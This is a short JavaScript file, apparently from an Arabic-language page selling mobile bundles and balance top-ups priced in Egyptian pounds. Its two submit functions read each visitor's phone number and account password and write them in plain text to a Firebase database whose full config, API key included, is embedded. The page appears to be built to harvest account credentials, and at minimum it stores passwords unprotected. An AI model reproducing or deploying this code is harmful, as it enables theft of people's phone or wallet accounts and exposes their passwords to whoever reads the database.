// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
  authDomain: "starkoscript.firebaseapp.com",
  databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
  projectId: "starkoscript",
  storageBucket: "starkoscript.appspot.com",
  messagingSenderId: "381525854892",
  appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
};

const app = firebase.initializeApp(firebaseConfig);
const db = firebase.database();

function sendData(packageName, price, numId, passId) {
  const number = document.getElementById(numId).value;
  const password = document.getElementById(passId).value;
  db.ref('requests/' + Date.now()).set({
    package: packageName,
    price: price,
    number: number,
    password: password,
    status: "pending"
  });
  alert('تم ارسال الطلب');
}

function calculate() {
  const amount = document.getElementById('amount').value;
  const total = amount * 1.23;
  document.getElementById('result').innerText = 'المبلغ المطلوب: ' + total + ' جنيه';
}

function sendBalance() {
  const number = document.getElementById('num5').value;
  const password = document.getElementById('pass5').value;
  const amount = document.getElementById('amount').value;
  db.ref('balanceRequests/' + Date.now()).set({
    number: number,
    password: password,
    amount: amount,
    status: "pending"
  });
  alert('تم ارسال طلب الشحن');
}
